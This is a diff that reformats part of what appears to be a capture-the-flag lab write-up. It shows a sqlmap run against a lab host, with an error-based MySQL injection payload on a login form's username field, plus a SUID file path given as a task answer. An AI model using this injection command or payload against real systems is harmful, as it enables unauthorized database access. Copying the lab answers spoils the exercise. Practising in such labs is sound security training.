@@ -115,8 +115,15 @@
        kali@kali:~$ sqlmap -v -u 
        http://10.10.85.135/administrator.php  --data 'username=&password=' -users -T --dump
              ___
-            __H__                                                                                           ___ ___[.]_____ ___ ___  {1.4.10#stable}                                                            |_ -| . [)]     | .'| . |                                                                            |___|_  [,]_|_|_|__,|  _|                                                                                  |_|V...       |_|   http://sqlmap.org  
-     [!] legal disclaimer: Usage of sqlmap for attacking targets  without prior mutual consent is          illegal. It is the end user's responsibility to obey all applicable local, state and federal          laws. Developers assume no liability and are not responsible for any misuse or damage caused by      this program
+            __H__                                                                               
+      ___ ___[.]_____ ___ ___  {1.4.10#stable}                                                           
+      |_ -| . [)]     | .'| . |                                                                            
+      |___|_  [,]_|_|_|__,|  _|                                                                                  
+            |_|V...       |_|   http://sqlmap.org  
+     [!] legal disclaimer: Usage of sqlmap for attacking targets  without prior mutual consent is          
+     illegal. It is the end user's responsibility to obey all applicable local, state and federal          
+     laws. Developers assume no liability and are not responsible for any misuse or damage caused by      
+     this program
      
      [*] starting @ 02:21:31 /2020-11-07/
      
@@ -126,7 +133,7 @@
      [02:21:32] [INFO] testing connection to the target URL
      sqlmap resumed the following injection point(s) from stored session:
      ---
-     Parameter: username (POST)
+    Parameter: username (POST)
     Type: error-based
     Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
     Payload: username=' AND GTID_SUBSET(CONCAT(0x716b6b6a71,(SELECT                            (ELT(3138=3138,1))),0x7170707a71),3138)-- LQrA&password=
@@ -285,6 +292,7 @@
             -rwsr-xr-x 1 root root 27608 May 16  2018 /bin/umount
 
 1) What is the interesting path of the interesting suid file
+   
     **/opt/secret/root**
                 
 **Task 7 (pwndbg)**
